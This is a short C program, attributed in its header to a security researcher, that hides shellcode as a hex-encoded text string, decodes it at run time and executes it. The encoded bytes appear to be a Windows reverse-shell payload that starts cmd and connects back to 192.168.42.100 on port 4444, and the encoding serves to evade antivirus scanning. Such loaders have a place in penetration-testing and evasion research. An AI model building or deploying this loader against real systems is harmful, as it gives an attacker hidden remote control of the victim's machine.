/*
Filename: example2.c
Author: Daniel Sauder
Website: http://govolution.wordpress.com
License http://creativecommons.org/licenses/by-sa/3.0/
Purpose: Demonstrate an ASCII decoder
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <stdlib.h>

void exec_shellcode(unsigned char *shellcode)
{
  int (*funct)();
  funct = (int (*)()) shellcode;
  (int)(*funct)();
}

// return pointer to shellcode
unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
{
  int j=0;
  shellcode=malloc((size/2));

  int i=0;
  do
  {
    unsigned char temp[3]={0};
    sprintf((char*)temp,"%c%c",buffer[i],buffer[i+1]);
    shellcode[j] = strtoul(temp, NULL, 16);

    i+=2;
    j++;
  } while(i<size);

  return shellcode;
}


int main (int argc, char **argv)
{
	unsigned char *shellcode;
	unsigned char buffer[]=
	"fce8890000006089e531d2648b5230"
	"8b520c8b52148b72280fb74a2631ff"
	"31c0ac3c617c022c20c1cf0d01c7e2"
	"f052578b52108b423c01d08b407885"
	"c0744a01d0508b48188b582001d3e3"
	"3c498b348b01d631ff31c0acc1cf0d"
	"01c738e075f4037df83b7d2475e258"
	"8b582401d3668b0c4b8b581c01d38b"
	"048b01d0894424245b5b61595a51ff"
	"e0585f5a8b12eb865d683332000068"
	"7773325f54684c772607ffd5b89001"
	"000029c454506829806b00ffd55050"
	"50504050405068ea0fdfe0ffd589c7"
	"68c0a82a64680200115c89e66a1056"
	"576899a57461ffd568636d640089e3"
	"57575731f66a125956e2fd66c74424"
	"3c01018d442410c600445450565656"
	"46564e565653566879cc3f86ffd589"
	"e04e5646ff306808871d60ffd5bbf0"
	"b5a25668a695bd9dffd53c067c0a80"
	"fbe07505bb4713726f6a0053ffd5";

	int size = sizeof(buffer);

	shellcode = decode_shellcode(buffer,shellcode,size);
	exec_shellcode(shellcode);
}
